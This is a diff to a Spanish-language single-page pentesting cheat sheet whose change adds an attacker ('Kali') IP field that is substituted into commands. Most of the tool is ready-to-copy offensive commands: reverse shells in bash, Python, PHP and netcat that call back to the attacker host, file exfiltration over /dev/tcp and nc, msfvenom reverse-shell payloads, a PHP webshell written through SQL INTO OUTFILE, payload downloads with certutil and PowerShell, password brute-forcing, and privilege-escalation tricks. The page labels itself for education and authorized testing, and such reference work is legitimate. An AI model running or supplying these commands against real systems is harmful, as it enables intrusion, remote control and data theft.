@@ -66,6 +66,7 @@
   input:focus{border-color:var(--green-d);box-shadow:0 0 0 3px var(--green-glow)}
   input::placeholder{color:var(--dimmer)}
   #ip{color:var(--amber);font-weight:600}
+  #kip{color:var(--violet);font-weight:600}
 
   .filters-bar{display:flex;align-items:center;gap:10px;margin-top:14px}
   .filters-toggle{
@@ -134,6 +135,7 @@
   .cmd code .tool{color:var(--cyan);font-weight:600}
   .cmd code .flag{color:var(--green)}
   .cmd code .var{color:var(--amber)}
+  .cmd code .var2{color:var(--violet)}
   .cmd code .str{color:var(--violet)}
   .cmd code .cmt{color:var(--dimmer);font-style:italic}
   .copy{
@@ -247,7 +249,7 @@
       <button class="tab on" id="tabCmds">⌘ comandos</button>
       <button class="tab" id="tabGuides">▤ guías</button>
     </div>
-    <div class="lede" id="lede">Pon la IP objetivo una vez y se aplica a todo · busca o filtra por fase · clic para copiar. Todo local, un fichero.</div>
+    <div class="lede" id="lede">Pon la IP objetivo y tu IP de Kali una vez y se aplican a todo · busca o filtra por fase · clic para copiar. Todo local, un fichero.</div>
 
     <div class="controls" id="cmdControls">
       <div class="field">
@@ -259,6 +261,11 @@
         <label>IP objetivo</label>
         <span class="ic">◎</span>
         <input id="ip" placeholder="10.10.10.10" autocomplete="off">
+      </div>
+      <div class="field ip">
+        <label>IP kali (atacante)</label>
+        <span class="ic">◈</span>
+        <input id="kip" placeholder="10.10.14.5" autocomplete="off">
       </div>
     </div>
     <div class="filters-bar" id="filtersBar">
@@ -277,7 +284,7 @@
   <div id="guides" class="hidden"></div>
 
   <footer>
-    <kbd>/</kbd> buscar · <kbd>esc</kbd> limpiar · la IP se sustituye en cada comando<br>
+    <kbd>/</kbd> buscar · <kbd>esc</kbd> limpiar · ambas IPs se sustituyen en cada comando (amber = objetivo, violeta = tu Kali)<br>
     Uso educativo · pentesting autorizado y entornos controlados
   </footer>
 </div>
@@ -302,7 +309,7 @@ const D = [
   ["scan","Detectar el sistema operativo","-O intenta identificar el SO por la pila TCP/IP","sudo nmap -O {IP}"],
   ["scan","Escaneo agresivo todo en uno","-A junta -sV, -sC, -O y traceroute; rápido para una primera foto","nmap -A {IP}"],
   ["scan","Escanear varios puertos concretos","lista separada por comas cuando ya sabes cuáles te interesan","nmap -p 22,80,443,445,3306 {IP}"],
-  ["scan","TCP y UDP en la misma orden","T: para puertos TCP y U: para UDP en una sola pasada","sudo nmap -p T:80,U:53 {IP}"],
+  ["scan","TCP y UDP en la misma orden","T: para puertos TCP y U: para UDP en una sola pasada; hacen falta -sS y -sU explícitos o los calificadores T:/U: no surten efecto","sudo nmap -sS -sU -p T:80,U:53 {IP}"],
   ["scan","Escanear una lista de objetivos","-iL lee las IPs de un fichero (una por línea)","nmap -iL objetivos.txt -oN barrido"],
   ["scan","Por qué un puerto está en ese estado","--reason explica si respondió, no respondió o fue filtrado","nmap --reason {IP}"],
   ["scan","Ver el porqué del escaneo en vivo","-vv da salida muy detallada mientras corre","nmap -p- -vv {IP}"],
@@ -362,16 +369,18 @@ const D = [
   // ===== 8. Bases de datos =====
   ["db","Conectar a MySQL","-h host, -u usuario; pedirá la contraseña","mysql -h {IP} -u root -p"],
   ["db","Conectar a MSSQL","cliente de impacket para SQL Server","impacket-mssqlclient usuario:password@{IP}"],
-  ["db","Enumerar MySQL con nmap","scripts que sacan versión, usuarios y bases de datos","nmap -p3306 --script mysql-* {IP}"],
+  ["db","Enumerar MySQL con nmap","scripts que sacan versión, usuarios y bases de datos; comillas para que el shell no expanda el comodín","nmap -p3306 --script \"mysql-*\" {IP}"],
   ["db","Comandos SQL básicos de enumeración","dentro del cliente: listar bases, tablas y datos","show databases; use nombre; show tables;"],
   ["db","Escritura de webshell vía SQL (MySQL)","si hay FILE priv y ruta web escribible","SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/sh.php';"],
 
   // ===== 9. Otros servicios (RDP/LDAP/NFS/SMTP) =====
-  ["other","Conectar por RDP","cliente de escritorio remoto con credenciales","xfreerdp /u:usuario /p:password /v:{IP}"],
+  ["other","Conectar por RDP","cliente de escritorio remoto con credenciales; /cert:ignore evita el prompt de certificado","xfreerdp /u:usuario /p:password /v:{IP} /cert:ignore"],
   ["other","Enumerar LDAP","vuelca la información del árbol LDAP sin autenticar","ldapsearch -x -H ldap://{IP} -b 'dc=target,dc=dl'"],
   ["other","Listar exports NFS","muestra qué carpetas comparte el servidor NFS","showmount -e {IP}"],
-  ["other","Montar un export NFS","monta la carpeta compartida en local para leerla","sudo mount -t nfs {IP}:/ruta /mnt/nfs"],
+  ["other","Montar un export NFS","monta la carpeta compartida en local para leerla; crea antes el punto de montaje","sudo mkdir -p /mnt/nfs; sudo mount -t nfs {IP}:/ruta /mnt/nfs"],
   ["other","Enumerar usuarios SMTP (VRFY)","comprueba qué usuarios existen en el servidor de correo","smtp-user-enum -M VRFY -U usuarios.txt -t {IP}"],
+  ["other","Enumerar SNMP con community por defecto","muchos dispositivos dejan 'public' de lectura: vuelca todo el árbol MIB (usuarios, procesos, rutas)","snmpwalk -c public -v1 {IP}"],
+  ["other","Comprobar SNMP con NSE","snmp-info confirma la versión y datos del sistema si el 161/UDP responde","nmap -sU -p161 --script snmp-info {IP}"],
 
   // ===== 10. Búsqueda de exploits =====
   ["vuln","Buscar exploit por servicio y versión","busca en la base local de Exploit-DB coincidencias para lo que encontraste","searchsploit openfire 4.7"],
@@ -394,7 +403,7 @@ const D = [
   ["brute","Fuerza bruta de login web (POST)","^USER^/^PASS^ son los huecos; F= marca el texto que aparece cuando falla el login","hydra -l admin -P /usr/share/wordlists/rockyou.txt {IP} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'"],
   ["brute","Fuerza bruta FTP","-L prueba varios usuarios (lista) contra la lista de contraseñas","hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ftp://{IP}"],
   ["brute","Fuerza bruta con usuarios y claves","-L y -P a la vez: cruza cada usuario con cada contraseña","hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ssh://{IP}"],
-  ["brute","Fuerza bruta genérica a un servicio","cambia el módulo final (rdp, smb, mysql, ftp…)","hydra -l usuario -P /usr/share/wordlists/rockyou.txt rdp://{IP}"],
+  ["brute","Fuerza bruta genérica a un servicio","cambia el módulo final (smb, mysql, ftp…); el módulo rdp de Hydra falla en muchos builds — si da error, usa ncrack -p 3389 {IP}","hydra -l usuario -P /usr/share/wordlists/rockyou.txt rdp://{IP}"],
 
   // ===== 13. Cracking de hashes =====
   ["crack","Identificar el tipo de hash","hashid dice qué algoritmo es antes de crackear","hashid '$1$xyz...'"],
@@ -416,7 +425,7 @@ const D = [
   // ===== 15. Metasploit =====
   ["msf","Abrir la consola de Metasploit","-q arranca sin el banner de inicio","msfconsole -q"],
   ["msf","Buscar un módulo","filtra los módulos disponibles por nombre de servicio o CVE","search openfire"],
-  ["msf","Cargar un módulo","use selecciona el módulo; a partir de ahí se configuran sus opciones","use exploit/multi/http/openfire_auth_bypass_rce"],
+  ["msf","Cargar un módulo","use selecciona el módulo; a partir de ahí se configuran sus opciones","use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315"],
   ["msf","Ver las opciones de un módulo","lista qué parámetros hay que rellenar (RHOSTS, LHOST, etc.)","options"],
   ["msf","Fijar el objetivo","RHOSTS es la máquina víctima; LHOST tu IP para las reverse shell","set RHOSTS {IP}"],
   ["msf","Enumerar usuarios SSH válidos","módulo auxiliar que confirma qué nombres de usuario existen por SSH","use auxiliary/scanner/ssh/ssh_enumusers"],
@@ -425,29 +434,29 @@ const D = [
   ["msf","Migrar/subir a Meterpreter","convierte una shell normal en sesión Meterpreter","sessions -u 1"],
 
   // ===== 15. Generar payloads (msfvenom) =====
-  ["payload","Reverse shell ELF (Linux)","binario que conecta de vuelta a tu LHOST:LPORT","msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT=4444 -f elf -o shell"],
-  ["payload","Reverse shell EXE (Windows)","ejecutable para víctimas Windows","msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT=4444 -f exe -o shell.exe"],
-  ["payload","Webshell PHP con msfvenom","payload PHP para subir a una web","msfvenom -p php/reverse_php LHOST={IP} LPORT=4444 -f raw -o shell.php"],
-  ["payload","Reverse shell en formato WAR","para servidores Tomcat","msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT=4444 -f war -o shell.war"],
+  ["payload","Reverse shell ELF (Linux)","binario que conecta de vuelta a tu LHOST:LPORT (LHOST = tu IP de Kali, no la del objetivo)","msfvenom -p linux/x64/shell_reverse_tcp LHOST={KIP} LPORT=4444 -f elf -o shell"],
+  ["payload","Reverse shell EXE (Windows)","ejecutable para víctimas Windows; LHOST es tu IP de Kali","msfvenom -p windows/x64/shell_reverse_tcp LHOST={KIP} LPORT=4444 -f exe -o shell.exe"],
+  ["payload","Webshell PHP con msfvenom","payload PHP para subir a una web; LHOST es tu IP de Kali","msfvenom -p php/reverse_php LHOST={KIP} LPORT=4444 -f raw -o shell.php"],
+  ["payload","Reverse shell en formato WAR","para servidores Tomcat; LHOST es tu IP de Kali","msfvenom -p java/jsp_shell_reverse_tcp LHOST={KIP} LPORT=4444 -f war -o shell.war"],
 
   // ===== 16. Acceso / shells =====
   ["access","Poner un listener de netcat","-l escucha, -v verboso, -n sin DNS, -p el puerto; espera la conexión entrante","nc -lvnp 4444"],
-  ["access","Reverse shell en bash","abre una conexión a tu IP:puerto y redirige la shell por ese socket","bash -i >& /dev/tcp/{IP}/4444 0>&1"],
-  ["access","Reverse shell en python3","útil cuando bash falla: conecta y engancha una /bin/bash con pty","python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{IP}\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"],
-  ["access","Reverse shell en PHP","para webs con ejecución de PHP (subida de fichero, LFI a log…)","php -r '$s=fsockopen(\"{IP}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
-  ["access","Reverse shell con netcat (-e)","si la versión de nc soporta -e ejecuta la shell directamente","nc {IP} 4444 -e /bin/bash"],
-  ["access","Reverse shell con mkfifo","alternativa cuando nc no tiene -e","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} 4444 >/tmp/f"],
+  ["access","Reverse shell en bash","abre una conexión a tu IP de Kali:puerto y redirige la shell por ese socket","bash -i >& /dev/tcp/{KIP}/4444 0>&1"],
+  ["access","Reverse shell en python3","útil cuando bash falla: conecta a tu Kali y engancha una /bin/bash con pty","python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{KIP}\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"],
+  ["access","Reverse shell en PHP","para webs con ejecución de PHP (subida de fichero, LFI a log…); conecta a tu IP de Kali","php -r '$s=fsockopen(\"{KIP}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
+  ["access","Reverse shell con netcat (-e)","si la versión de nc soporta -e ejecuta la shell directamente contra tu Kali","nc {KIP} 4444 -e /bin/bash"],
+  ["access","Reverse shell con mkfifo","alternativa cuando nc no tiene -e; conecta a tu Kali","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {KIP} 4444 >/tmp/f"],
   ["access","Bind shell (la víctima escucha)","cuando no puedes recibir conexiones: te conectas tú a ella","nc {IP} 4444"],
 
   // ===== 17. Transferencia de archivos =====
   ["transfer","Servir ficheros por HTTP","levanta un servidor web en el 8000 sobre la carpeta actual","python3 -m http.server 8000"],
-  ["transfer","Descargar con wget","trae un fichero desde tu servidor HTTP a la víctima","wget http://{IP}:8000/linpeas.sh"],
-  ["transfer","Descargar con curl","-o guarda con el nombre indicado","curl http://{IP}:8000/linpeas.sh -o linpeas.sh"],
+  ["transfer","Descargar con wget","trae un fichero desde tu servidor HTTP (tu IP de Kali) a la víctima","wget http://{KIP}:8000/linpeas.sh"],
+  ["transfer","Descargar con curl","-o guarda con el nombre indicado; la IP es la de tu Kali sirviendo el fichero","curl http://{KIP}:8000/linpeas.sh -o linpeas.sh"],
   ["transfer","Recibir un fichero con netcat","en tu Kali escuchas y guardas lo que llega","nc -lvnp 9001 > fichero"],
-  ["transfer","Enviar un fichero con netcat","desde la víctima lo mandas a tu listener","nc {IP} 9001 < fichero"],
-  ["transfer","Exfiltrar por /dev/tcp (sin nc)","cuando no hay netcat: escucha con nc -lvnp 9000 > out y ejecuta esto en la víctima","cat fichero > /dev/tcp/{IP}/9000"],
-  ["transfer","Descargar en Windows (certutil)","binario nativo de Windows para bajar ficheros","certutil -urlcache -f http://{IP}:8000/shell.exe shell.exe"],
-  ["transfer","Descargar en Windows (PowerShell)","IWR baja el fichero sin herramientas extra","powershell -c \"iwr http://{IP}:8000/shell.exe -o shell.exe\""],
+  ["transfer","Enviar un fichero con netcat","desde la víctima lo mandas a tu listener (tu IP de Kali)","nc {KIP} 9001 < fichero"],
+  ["transfer","Exfiltrar por /dev/tcp (sin nc)","cuando no hay netcat: escucha con nc -lvnp 9000 > out en tu Kali y ejecuta esto en la víctima","cat fichero > /dev/tcp/{KIP}/9000"],
+  ["transfer","Descargar en Windows (certutil)","binario nativo de Windows para bajar ficheros desde tu Kali","certutil -urlcache -f http://{KIP}:8000/shell.exe shell.exe"],
+  ["transfer","Descargar en Windows (PowerShell)","IWR baja el fichero desde tu Kali sin herramientas extra","powershell -c \"iwr http://{KIP}:8000/shell.exe -o shell.exe\""],
 
   // ===== 18. Estabilizar shell =====
   ["shell","Convertir la shell en una TTY","pty.spawn da una terminal interactiva de verdad (permite sudo, ssh, nano)","python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"],
@@ -490,7 +499,7 @@ const D = [
   ["pivot","5 · Hydra externo por el proxy","cualquier herramienta externa pasa por el túnel anteponiendo proxychains","proxychains hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.15"],
   // -- Alternativas sin Metasploit --
   ["pivot","Alt · Servidor chisel en tu Kali","túnel SOCKS sin Metasploit; --reverse deja que el cliente conecte de vuelta","chisel server -p 8000 --reverse"],
-  ["pivot","Alt · Cliente chisel en el pivot","R:socks crea el proxy SOCKS inverso que sale por la red interna","chisel client {IP}:8000 R:socks"],
+  ["pivot","Alt · Cliente chisel en el pivot","R:socks crea el proxy SOCKS inverso que sale por la red interna; conecta a tu Kali, donde corre el chisel server","chisel client {KIP}:8000 R:socks"],
   ["pivot","Alt · Redirigir un puerto con socat","reenvía tu 8080 a un puerto de un host interno inalcanzable directo","socat TCP-LISTEN:8080,fork TCP:10.10.10.15:80"],
   ["pivot","Alt · Túnel SSH dinámico (SOCKS)","-D abre un proxy SOCKS por la conexión SSH; combínalo con proxychains","ssh -D 1080 usuario@{IP}"],
   ["pivot","Alt · Port forward local por SSH","-L trae un puerto de un host interno directo a tu localhost","ssh -L 8080:10.10.10.15:80 usuario@{IP}"],
@@ -501,10 +510,10 @@ const D = [
   ["privesc","Buscar capabilities peligrosas","getcap lista permisos especiales (cap_setuid, etc.) que permiten escalar","getcap -r / 2>/dev/null"],
   ["privesc","Revisar tareas cron","scripts programados que corren como root y quizá puedas modificar","cat /etc/crontab"],
   ["privesc","Ficheros de root escribibles","ficheros que root ejecuta y tú puedes editar: vector directo","find / -writable -type f 2>/dev/null | grep -v '/proc'"],
-  ["privesc","Escalada vía env con SUID","si env tiene el bit SUID, lanza una shell manteniendo privilegios (-p)","./env /bin/sh -p"],
+  ["privesc","Escalada vía env con SUID","si env tiene el bit SUID, lanza una shell manteniendo privilegios (-p)","env /bin/sh -p"],
   ["privesc","Shell root si bash es SUID","-p conserva el usuario efectivo root en lugar de degradar a tu usuario","bash -p"],
   ["privesc","Ver versión del kernel","para buscar exploits de kernel si no hay otro vector","uname -a"],
-  ["privesc","Fuerza bruta de su root con una lista","prueba cada contraseña contra su root hasta dar con la de root","while read p; do echo \"$p\" | timeout 2 su root -c 'id' 2>/dev/null | grep -q uid=0 && echo \"ROOT: $p\" && break; done < passwords.txt"],
+  ["privesc","Fuerza bruta de su root con una lista","prueba cada contraseña contra su root hasta dar con la de root — ojo, su a veces lee la contraseña de la TTY y no de stdin, puede no funcionar en todas las shells","while read p; do echo \"$p\" | timeout 2 su root -c 'id' 2>/dev/null | grep -q uid=0 && echo \"ROOT: $p\" && break; done < passwords.txt"],
   ["privesc","Extraer contraseñas de un binario SUID","strings sobre el binario privilegiado revela credenciales hardcodeadas","strings /usr/local/bin/task_manager | grep -iE 'pass|pwd|key'"],
   ["privesc","Escalada por grupo docker","si estás en el grupo docker, montas la raíz del host como root","docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
 
@@ -514,6 +523,7 @@ const D = [
   ["winpriv","Enumeración automática (WinPEAS)","equivalente de linpeas para Windows","winpeas.exe"],
   ["winpriv","Buscar contraseñas en ficheros","rastreo rápido de credenciales en texto","findstr /si password *.txt *.ini *.config"],
   ["winpriv","Servicios con ruta sin comillas","unquoted service path: vector de escalada clásico","wmic service get name,pathname,startmode | findstr /i auto"],
+  ["winpriv","Comprobar AlwaysInstallElevated","si ambas claves están a 1, cualquier .msi se instala como SYSTEM: genera uno con msfvenom -f msi","reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"],
 ];
 
 const META = {
@@ -526,7 +536,7 @@ const META = {
   ftp:{n:"ftp",c:"var(--green)"},
   dns:{n:"dns",c:"var(--green)"},
   db:{n:"bases de datos",c:"var(--green)"},
-  other:{n:"rdp / ldap / nfs / smtp",c:"var(--green)"},
+  other:{n:"rdp / ldap / nfs / smtp / snmp",c:"var(--green)"},
   vuln:{n:"exploits",c:"var(--amber)"},
   webexp:{n:"web ofensiva",c:"var(--amber)"},
   brute:{n:"fuerza bruta",c:"var(--amber)"},
@@ -547,7 +557,7 @@ const ORDER = Object.keys(META);
 let activePhase=null, query="";
 const $=s=>document.querySelector(s);
 const listEl=$("#list"), countEl=$("#count"), filtersEl=$("#filters");
-const searchEl=$("#search"), ipEl=$("#ip");
+const searchEl=$("#search"), ipEl=$("#ip"), kipEl=$("#kip");
 
 // chips
 filtersEl.innerHTML = ORDER.map(p=>{
@@ -587,16 +597,18 @@ function updateFilterUI(){
 
 searchEl.addEventListener("input",()=>{query=searchEl.value.toLowerCase().trim();render()});
 ipEl.addEventListener("input",render);
+kipEl.addEventListener("input",render);
 
 const COPY_ICON=`<svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>`;
 const CHECK_ICON=`<svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>`;
 
-const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|docker|uname|for|while|rm|mkfifo|echo|put|get|sqlmap|stegsnow|steghide|strings|exiftool|file|binwalk|ifconfig|ipconfig|route|nano|nxc|evil-winrm)\b/;
+const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|reg|docker|uname|for|while|rm|mkfifo|echo|put|get|sqlmap|stegsnow|steghide|strings|exiftool|file|binwalk|ifconfig|ipconfig|route|nano|nxc|evil-winrm)\b/;
 
 function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
 function applyIP(cmd){
   const ip=ipEl.value.trim()||"{IP}";
-  return cmd.replaceAll("{IP}",ip);
+  const kip=kipEl.value.trim()||"{KIP}";
+  return cmd.replaceAll("{IP}",ip).replaceAll("{KIP}",kip);
 }
 
 function matches(r){
@@ -645,6 +657,7 @@ function render(){
 // highlight que además pinta la IP objetivo
 function highlightWithIP(cmd){
   const ip=ipEl.value.trim();
+  const kip=kipEl.value.trim();
   if(cmd.startsWith("#"))return `<span class="cmt">${esc(cmd)}</span>`;
   let h=esc(cmd);
   h=h.replace(TOOLS,m=>{
@@ -654,6 +667,12 @@ function highlightWithIP(cmd){
   h=h.replace(/(\s)(-{1,2}[a-zA-Z][\w-]*)/g,'$1<span class="flag">$2</span>');
   h=h.replace(/('[^']*')/g,'<span class="str">$1</span>');
   h=h.replace(/(#[^<]*)$/g,'<span class="cmt">$1</span>');
+  if(kip){
+    const safeK=kip.replace(/[.*+?^${}()|[\]\\]/g,"\\$&");
+    h=h.replace(new RegExp(safeK,"g"),`<span class="var2">${esc(kip)}</span>`);
+  }else{
+    h=h.replace(/\{KIP\}/g,'<span class="var2">{KIP}</span>');
+  }
   if(ip){
     const safe=ip.replace(/[.*+?^${}()|[\]\\]/g,"\\$&");
     h=h.replace(new RegExp(safe,"g"),`<span class="var">${esc(ip)}</span>`);
@@ -799,7 +818,7 @@ const GUIDES = [
     "Enumera SMB (445): <code>nxc smb IP</code> (NetExec), <code>enum4linux -a IP</code>, NSE <code>smb-os-discovery</code>.",
     "Prueba credenciales por SMB con NetExec; si sale <b>(Pwn3d!)</b> puedes ejecutar comandos (<code>nxc smb IP -u X -p Y -x whoami</code>).",
     "Si el <b>WinRM (5985)</b> acepta las credenciales, consigue shell con <code>evil-winrm -i IP -u X -p Y</code>.",
-    "Si hay RDP (3389): <code>xfreerdp /u:usuario /p:pass /v:IP</code>.",
+    "Si hay RDP (3389): <code>xfreerdp /u:usuario /p:pass /v:IP /cert:ignore</code>.",
     "Sin shell aún: genera payload con <code>msfvenom -p windows/... -f exe</code> y pásalo con certutil o PowerShell.",
     "Escalada: <code>whoami /priv</code> (SeImpersonate → Potato), <code>systeminfo</code> para exploits, y WinPEAS.",
   ],"Con credenciales válidas, WinRM (evil-winrm) es la vía más limpia para tener consola en Windows.",
